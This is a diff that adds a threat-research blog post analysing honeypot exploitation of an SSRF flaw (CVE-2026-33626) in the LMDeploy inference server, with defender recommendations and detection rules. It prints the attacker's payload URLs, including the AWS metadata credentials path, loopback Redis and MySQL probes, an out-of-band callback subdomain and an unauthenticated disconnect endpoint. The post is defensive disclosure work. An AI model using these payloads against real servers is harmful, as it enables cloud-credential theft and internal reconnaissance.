@@ -1,0 +1,214 @@
+<h1>CVE-2026-33626: How attackers exploited LMDeploy LLM Inference Engines in 12 hours</h1>
+<p><strong>Published:</strong> April 22, 2026</p>
+<p>On April 21, 2026, GitHub published <a href="https://github.com/advisories/GHSA-6w67-hwm5-92mq">GHSA-6w67-hwm5-92mq</a>, later assigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33626">CVE-2026-33626</a>, a Server-Side Request Forgery (SSRF) vulnerability in <a href="https://github.com/InternLM/lmdeploy">LMDeploy</a>. LMDeploy is a toolkit for serving vision-language and text large language models (LLMs) developed by Shanghai AI Laboratory, InternLM.</p>
+<p>Within 12 hours and 31 minutes of its publication on the main GitHub advisory page, the Sysdig Threat Research Team (TRT) observed the first LMDeploy exploitation attempt against our honeypot fleet. The attacker did not simply validate the bug and move on. Instead, over a single eight-minute session, they used the vision-language image loader as a generic HTTP SSRF primitive to port-scan the internal network behind the model server: AWS Instance Metadata Service (IMDS), Redis, MySQL, a secondary HTTP administrative interface, and an out-of-band (OOB) DNS exfiltration endpoint.</p>
+<p>The Sysdig TRT deployed a honeypot running a vulnerable LMDeploy instance shortly after the advisory went live. The malicious activity that followed shows how an attacker weaponizes a narrowly described SSRF against an AI-infrastructure tool such as LMDeploy.</p>
+<h2>Exploitation timeline</h2>
+<table>
+ <thead>
+  <tr>
+   <th>Time (UTC)</th>
+   <th>Event</th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>April 18, 1509</td>
+   <td>Repository-level GitHub Security Advisory (GHSA) published</td>
+  </tr>
+  <tr>
+   <td>April 20, 21:16</td>
+   <td>CVE-2026-33626 created in NVD</td>
+  </tr>
+  <tr>
+   <td><strong>Apr 21, 15:04</strong></td>
+   <td><strong>GHSA-6w67-hwm5-92mq published on GitHub</strong></td>
+  </tr>
+  <tr>
+   <td>Apr 22, 03:35</td>
+   <td>First exploitation attempt observed (from 103.116.72.119)</td>
+  </tr>
+ </tbody>
+</table>
+<p>The gap between the indexed GHSA publication and the first exploitation was 12 hours and 31 minutes. No public proof-of-concept (PoC) code existed on GitHub or any major exploit repository at the time of the attack. As with several recent niche-target cases, the advisory text itself contained enough detail to construct a working exploit from scratch, including the affected file, parameter name, and the absence of scheme or host validation.</p>
+<p><strong>NOTE</strong>: There is no straightforward way to search for repository-level GHSAs — they require monitoring specific repositories — so the Sysdig TRT does not include repository-level GHSA publication in our advisory-to-exploit 12-hour timeline. Instead, our clock begins when the advisory was published on the main GitHub advisory page.</p>
+<h2>The LMDeploy vulnerability</h2>
+<p>LMDeploy is a production inference toolkit that serves vision-language models (VLMs), such as InternVL2, internlm-xcomposer2, and Qwen2-VL, through an OpenAI-compatible HTTP API. When a chat completion request contains an <code>image_url</code> field, the server dereferences that URL and loads the image into the model's context.</p>
+<p>Below is the standard OpenAI vision-message shape:</p>
+<pre><code>\{
+  "model": "internlm-xcomposer2",
+  "messages": [\{
+    "role": "user",
+    "content": [
+      \{"type": "text", "text": "describe this"},
+      \{"type": "image_url", "image_url": \{"url": "http://..."}}
+    ]
+  }]
+}</code></pre>
+<p>As you can see, this code lacks a hostname resolution check, private-network blocklist, and protection for link-local addresses. Any URL with an <code>http://</code> or <code>https://</code> scheme — including http://169.254.169.254/, http://127.0.0.1:3306, or any RFC 1918 address — was fetched by the server and returned to the model, or in the case of a binary protocol like Redis or MySQL, returned enough of an error response to confirm the port was open.</p>
+<h2>The three phases of LMDeploy exploitation</h2>
+<p>Over the eight-minute session, 103.116.72.119 produced 10 distinct requests across three phases, alternating between two vision-language models, internlm-xcomposer2 and OpenGVLab/InternVL2-8B. Switching models mid-session suggests that the operator was aware that some VLMs refuse suspicious inputs and tests both models.</p>
+<h3>Phase 1: Cloud-metadata and Redis (03:35:22 to 03:37:45 UTC)</h3>
+<p>The attacker's first request targeted AWS IMDS directly:</p>
+<pre><code>POST /v1/chat/completions
+model: internlm-xcomposer2
+image_url: http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</code></pre>
+<p>Two minutes later the attacker pivoted to the loopback Redis port:</p>
+<pre><code>image_url: http://127.0.0.1:6379
+</code></pre>
+<p>The choice of port 6379 is significant: It is the standard Redis port and a well-known post-IMDS target in SSRF chains. This SSRF primitive does not support arbitrary body content, but a successful connection on 6379 would confirm that Redis is present on the internal interface.</p>
+<h3>Phase 2: OOB callback and API enumeration (03:41:07 to 03:41:58 UTC)</h3>
+<p>Three minutes later the attacker tested egress with an out-of-band (OOB) DNS callback to requestrepo.com, a public OAST (out-of-band application security testing) service similar to Burp Collaborator and Project Discovery's interact.sh:</p>
+<pre><code>image_url: http[://]cw2mhnbd.requestrepo.com</code></pre>
+<p>On a vulnerable real-world LMDeploy instance with unrestricted egress, the attacker's requestrepo.com dashboard would receive an HTTP callback confirming both the SSRF and that the server can reach arbitrary external hosts. This is a standard blind-SSRF confirmation step.</p>
+<p>Immediately after the OOB test, the attacker enumerated the API surface:</p>
+<pre><code>GET /
+GET /openapi.json
+POST /v1/chat/completions  (model: OpenGVLab/InternVL2-8B, no image_url)
+</code></pre>
+<p>The <code>/openapi.json</code> request is typical of an attacker reading the server's auto-generated OpenAPI schema to find additional endpoints beyond <code>/v1/chat/completions</code>. LMDeploy exposes several administrative endpoints under <code>/distserve/*</code> for its serving mode, which were almost certainly discovered here.</p>
+<h3>Phase 3: Admin-plane probe and localhost port sweep (03:42:35 to 03:43:53 UTC)</h3>
+<p>The attacker first probed the distributed-serving kill-switch:</p>
+<pre><code>POST /distserve/p2p_drop_connect
+body: \{}</code></pre>
+<p>The endpoint above tears down the ZMQ link to a named remote engine in a disaggregated LMDeploy cluster. The affected code calls <code>self.zmq_disconnect(drop_conn_request.remote_engine_id)</code> and returns <code>\{'success': True}</code>. An attacker who knows or guesses a live <code>remote_engine_id</code> can disrupt the <code>prefill/decode</code> route for that peer, degrading or breaking inference flowing through it. In the affected versions, these endpoints had no authentication layer in the default configuration.</p>
+<p>The attacker then returned to the SSRF primitive and systematically port-scanned the loopback interface over 36 seconds:</p>
+<table>
+ <thead>
+  <tr>
+   <th>Time</th>
+   <th>Target URL</th>
+   <th>Likely service</th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>03:43:17</td>
+   <td>http://127.0.0.1:8080</td>
+   <td>secondary HTTP / proxy admin</td>
+  </tr>
+  <tr>
+   <td>03:43:36</td>
+   <td>http://127.0.0.1:3306</td>
+   <td>MySQL</td>
+  </tr>
+  <tr>
+   <td>03:43:53</td>
+   <td>http://127.0.0.1</td>
+   <td>HTTP port 80</td>
+  </tr>
+ </tbody>
+</table>
+<p>Three localhost probes in 36 seconds is the signature of a scripted port sweep using the SSRF as a probe primitive. The attacker is not looking for image files; they are instead treating the vision-LLM endpoint as a generic HTTP GET that can reach addresses the external network cannot. Every one of these URLs is blocked by the v0.12.3 <code>_is_safe_url()</code> check.</p>
+<h2>What this means for defenders</h2>
+<p>CVE-2026-33626 fits a pattern that we have observed repeatedly in the AI-infrastructure space over the past six months: critical vulnerabilities in inference servers, model gateways, and agent orchestration tools are being weaponized within hours of advisory publication, regardless of the size or extent of their install base. LMDeploy, for instance, has 7,798 GitHub stars, an order of magnitude less than mainstream projects like vLLM or Ollama, and it does not appear in <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">CISA's Known Exploited Vulnerabilities (KEV) catalog</a>.</p>
+<p>The observed timeline extends the trend reported in the <a href="https://zerodayclock.com/">Zero Day Clock</a> project and our own prior research on <a href="https://sysdig.com/blog/marimo-oss-python-notebook-rce-from-disclosure-to-exploitation-in-under-10-hours">marimo's pre-auth RCE</a>. Attackers are no longer waiting for mass-exploitation tools. The advisory text, read carefully, is enough to craft an exploit.</p>
+<p>Generative AI (GenAI) is accelerating this collapse. An advisory as specific as GHSA-6w67-hwm5-92mq, which includes the affected file, parameter name, root-cause explanation, and sample vulnerable code, is effectively an input prompt for any commercial LLM to generate a potential exploit. We have recently observed and reported on this pattern across multiple recent niche-target exploitations: GHSA publishes, working exploit appears within hours, no public PoC existed.</p>
+<p>Any advisory that names the vulnerable function, shows the missing check, or quotes the affected code pattern, in the age of capable code-generation models, becomes a turnkey exploit. The irony that CVE-2026-33626's target is itself an LLM-serving framework is incidental; the same acceleration applies across the CVE landscape.</p>
+<p>What distinguishes CVE-2026-33626 from a textbook SSRF is what the primitive unlocks on an AI-serving node:</p>
+<ul>
+ <li><strong>IAM credentials and cloud metadata.</strong> Vision-LLM nodes typically run on GPU instances with broad IAM roles: S3 model artifacts, training datasets, and often cross-account <code>assume-role</code>. One successful IMDS fetch can compromise the cloud account.</li>
+ <li><strong>In-cluster data stores.</strong> Inference deployments typically ship with Redis for prompt caching, MySQL or Postgres for metering, and internal HTTP control planes. The attacker's probes (127.0.0.1:6379, 127.0.0.1:3306, and 127.0.0.1:8080) map directly onto this topology.</li>
+ <li><strong>Model-level denial of service.</strong> The <code>distserve/p2p_drop_connect</code> probe shows that the attacker understood LMDeploy's disaggregated-serving architecture: Tearing down the ZMQ link between prefill and decode engines disrupts inference on that route.</li>
+ <li><strong>Generic HTTP primitive.</strong> Unlike remote code execution (RCE), this SSRF is a read-only HTTP client inside the victim's network, reachable from the public internet. For reconnaissance before a larger operation, this access is often a more valuable foothold than many code-execution bugs.</li>
+</ul>
+<p>Combined with the lack of IP-level egress controls on many GPU-hosted environments, the class of bug seen with the LMDeploy vulnerability is particularly attractive.</p>
+<h2>Indicators of Compromise</h2>
+<h3>Source IPs</h3>
+<table>
+ <thead>
+  <tr>
+   <th>IP</th>
+   <th>Location</th>
+   <th>ASN</th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>103.116.72.119</td>
+   <td>Kowloon Bay, HK</td>
+   <td>AS400618 Prime Security Corp.</td>
+  </tr>
+ </tbody>
+</table>
+<p>The source IP may be a proxy, VPN endpoint, or cloud instance rented for the operation rather than the operator's true origin.</p>
+<h3>Callback infrastructure</h3>
+<table>
+ <thead>
+  <tr>
+   <th>Domain</th>
+   <th>Purpose</th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>cw2mhnbd.requestrepo.com</td>
+   <td>Out-of-band DNS/HTTP exfil subdomain provided by the requestrepo.com OAST service. The cw2mhnbd prefix is unique to this operator's session.</td>
+  </tr>
+ </tbody>
+</table>
+<h3>Target URLs fetched by the SSRF</h3>
+<table>
+ <thead>
+  <tr>
+   <th>URL</th>
+   <th>Classification</th>
+  </tr>
+ </thead>
+ <tbody>
+  <tr>
+   <td>http://169.254.169.254/latest/meta-data/iam/security-credentials/</td>
+   <td>AWS IMDSv1: IAM role credential exfiltration</td>
+  </tr>
+  <tr>
+   <td>http://127.0.0.1:6379</td>
+   <td>Loopback Redis</td>
+  </tr>
+  <tr>
+   <td>http://127.0.0.1:3306</td>
+   <td>Loopback MySQL</td>
+  </tr>
+  <tr>
+   <td>http://127.0.0.1:8080</td>
+   <td>Loopback secondary HTTP</td>
+  </tr>
+  <tr>
+   <td>http://127.0.0.1</td>
+   <td>Loopback HTTP (port 80)</td>
+  </tr>
+  <tr>
+   <td>http[://]cw2mhnbd.requestrepo.com</td>
+   <td>Blind-SSRF OOB confirmation</td>
+  </tr>
+ </tbody>
+</table>
+<h2>Runtime detection</h2>
+<p>Runtime detection for this attack class sits in two layers: the application layer and the host layer.</p>
+<p>At the application layer, any inference server that fetches URLs from user-supplied content should log the resolved IP of every outbound request and alert on requests to link-local (169.254.0.0/16), loopback (127.0.0.0/8, ::1), or RFC 1918 private ranges, as well as well-known service ports on those ranges (6379 Redis, 3306 MySQL, 5432 Postgres, 9200 Elasticsearch, 2375/2376 Docker). At the host layer, runtime detection captures the post-exploitation symptom (an outbound connection to a cloud metadata endpoint from an inference process) regardless of framework.</p>
+<p>Sysdig Secure ships several out-of-the-box Falco rules that fire on exactly the URLs the attacker attempted. Teams running Sysdig Secure on GPU and inference nodes should enable these detection rules for vision-language and agent tool-use workloads:</p>
+<ul>
+ <li>Contact EC2 Instance Metadata Service From Container</li>
+ <li>Contact EC2 Instance Metadata Service From Host</li>
+ <li>Contact GCP Instance Metadata Service From Container</li>
+ <li>Contact GCP Instance Metadata Service From Host</li>
+ <li>Contact Azure Instance Metadata Service From Container</li>
+ <li>Contact Azure Instance Metadata Service From Host</li>
+ <li>Contact Task Metadata Endpoint</li>
+</ul>
+<p>On a vulnerable real-world LMDeploy instance, the attacker's first request to the IMDS endpoint would trigger the rule <strong>Contact EC2 Instance Metadata Service From Container</strong> the moment the server-side <code>requests.get()</code> reached the IMDS endpoint, independent of any application-layer logging.</p>
+<p>The GCP and Azure rules fire the same way for victims running on those clouds, and <strong>Contact Task Metadata Endpoint</strong> covers ECS/Fargate workloads where IMDS lives at 169.254.170.2, rather than 169.254.169.254.</p>
+<h2>Recommendations</h2>
+<ul>
+ <li><strong>Assume breach.</strong></li>
+ <li><strong>Update LMDeploy to <a href="https://github.com/InternLM/lmdeploy/releases/tag/v0.12.3">v0.12.3</a> or later.</strong> If upgrading is not possible, front the inference API with a reverse proxy that strips or rewrites <code>image_url</code> values, or disable vision-model endpoints entirely.</li>
+ <li><strong>Enforce IMDSv2 on inference nodes.</strong> Set <code>httpTokens=required</code> to disable IMDSv1. This is the single highest-ROI control for this class of bug: a <code>requests.get()</code> SSRF primitive cannot acquire the required session token (no way to issue a <code>PUT /latest/api/token</code> first). Pair with <code>httpPutResponseHopLimit=1</code> to prevent containers reaching IMDS via the default bridge network.</li>
+ <li><strong>Restrict outbound egress from inference servers at the VPC/SG level.</strong> Inference nodes should only reach model-artifact storage (S3, GCS) and logging endpoints.</li>
+ <li><strong>Rotate any IAM role credentials</strong> attached to publicly reachable LMDeploy deployments version 0.12.2 or earlier.</li>
+ <li><strong>Audit internal service exposure on inference nodes.</strong> Redis, MySQL, and admin control planes should bind to a private interface only when genuinely required by the model server, and must require authentication regardless.</li>
+ <li><strong>Monitor outbound connections from inference processes</strong> to link-local, RFC 1918, or loopback addresses. These should be zero in normal operation.</li>
+ <li><strong>Inventory AI-infrastructure tooling.</strong> Model-serving platforms (LMDeploy, vLLM, TGI, Ray Serve) are frequently deployed outside standard security review and often not covered by CVE scanning until well after disclosure.</li>
+</ul>
+<h2>Conclusion</h2>
+<p>CVE-2026-33626 fits a consistent pattern: inference and agent-framework SSRF bugs weaponized within hours of GHSA publication, by operators who build from the advisory rather than wait for a public PoC. Twelve hours and 31 minutes from publication to the first observed exploitation of LMDeploy is short enough that "patch Tuesday" cadences and monthly scans are not a sufficient control. The attacker did not merely validate the bug, but they used it as a port-scanning primitive in a single eight-minute session.</p>
+<p>For defenders running AI infrastructure, vision-LLM image loaders, agent tool-use endpoints, and RAG fetchers are all SSRF candidates by default unless explicit egress filtering is applied. Runtime detection on the inference host, strict VPC egress controls, and rapid-patch response remain the most effective controls when the weaponization window is measured in hours.</p>
